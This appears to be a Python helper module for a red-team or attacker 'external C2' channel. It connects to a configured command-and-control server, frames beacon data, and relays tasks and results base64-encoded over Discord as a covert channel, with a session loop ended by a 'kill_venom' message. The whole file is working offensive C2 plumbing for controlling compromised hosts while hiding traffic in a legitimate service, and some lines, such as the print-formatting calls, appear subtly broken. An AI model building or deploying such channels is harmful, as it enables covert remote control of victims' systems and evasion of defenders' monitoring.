import socket
import struct
import config
from encoders import encoder_base64
from transports import transport_discord

def importModule(modName, modType):
    """
    Imports a passed module as either an 'encoder' or a 'transport'; called with either encoder.X() or transport.X()
    """
    prep_global = "global " + modType
    exec(prep_global)
    importName = "import utils." + modType + "s." + modName + " as " + modType
    exec(importName, globals())

def createSocket():
    # Borrowed from https://github.com/outflanknl/external_c2/blob/master/python_c2ex.py
    d = {}
    d['sock'] = socket.create_connection((config.EXTERNAL_C2_ADDR, int(config.EXTERNAL_C2_PORT)))
    d['state'] = 1
    return (d['sock'])

def sendFrameToC2(sock, chunk):
    slen = struct.pack('<I', len(chunk))
    sock.sendall(slen + chunk)

def recvFrameFromC2(sock):
    try:
        chunk = sock.recv(4)
    except:
        return("")
    if len(chunk) < 4:
        return()
    slen = struct.unpack('<I', chunk)[0]
    chunk = sock.recv(slen)
    while len(chunk) < slen:
        chunk = chunk + sock.recv(slen - len(chunk))
    return(chunk)

def killSocket(sock):
    sock.close()

def prepData(data):
    # This will prepare whatever data is given based on the config
    rdyData = encoder_base64.encode(data)
    return rdyData

def decodeData(data):
    # This will decode whatever data is given based on the config
    rdyData = encoder_base64.decode(data)
    return rdyData

def retrieveData(beaconId):
    # This will retrieve data via the covert channel
    # Returns unencoded data

    taskData = transport_discord.retrieveData(beaconId)

    if config.debug:
        print(color("RAW RETRIEVED DATA: ", status=False, yellow=True) + "%s") % (taskData)

    # Prepare the received data by running it through the decoder
    for i in range(len(taskData)):
        taskData[i] = decodeData(taskData[i])

    return taskData

def sendData(data, beaconId):
    # This will upload the data via the covert channel
    # returns a confirmation that the data has been sent

    if config.debug:
        print(color("RAW DATA TO BE SENT: ", status=False, yellow=True) + "%s") % (data)

    # Prepares the data to be sent via the covert channel
    preped_data = prepData(data)

    transport_discord.sendData(preped_data, beaconId)

def color(string, status=True, warning=False, bold=True, yellow=False):
    """
    Change text color for the terminal, defaults to green

    Set "warning=True" for red
    """

    attr = []

    if status:
        # green
        attr.append('32')
    if warning:
        # red
        attr.append('31')
    if bold:
        attr.append('1')
    if yellow:
        attr.append('33')
    return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)

def notifySessionExit(beaconId):
    """
    Notify the C2 controller about the session exit for the given beacon ID.
    This function sends a special message indicating that the session has ended.
    """
    exit_message = f"Session with beacon ID {beaconId} has exited."
    sendData(exit_message, beaconId)

# Example usage in a session management context
def manageSession(beaconId):
    try:
        # Example session logic
        while True:
            data = retrieveData(beaconId)
            # Process the data as required
            # If a condition occurs to exit the session
            if data == 'kill_venom':
                break
    finally:
        # Ensure that we notify the controller of the exit
        notifySessionExit(beaconId)
        # Cleanup resources if needed
